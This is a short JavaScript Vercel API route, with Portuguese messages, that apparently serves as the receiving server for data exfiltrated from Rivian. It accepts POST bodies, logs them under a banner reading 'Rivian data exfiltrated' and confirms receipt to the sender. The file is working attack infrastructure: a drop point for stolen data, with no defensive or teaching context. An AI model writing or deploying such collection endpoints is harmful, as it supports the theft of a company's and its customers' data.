export default async function handler(req, res) {
  if (req.method === 'POST') {
    try {
      const exfiltratedData = req.body;

      console.log('--- DADOS RIVIAN EXFILTRADOS (VIA VERCEL API ROUTE) ---');
      console.log(JSON.stringify(exfiltratedData, null, 2));
      console.log('----------------------------------------------------');

      res.status(200).json({ message: 'Dados recebidos com sucesso pela sua API Vercel!' });
    } catch (error) {
      console.error('Erro ao processar dados de exfiltração:', error);
      res.status(500).json({ message: 'Erro interno ao processar dados.' });
    }
  } else {
    res.status(405).json({ message: 'Método não permitido. Use POST.' });
  }
}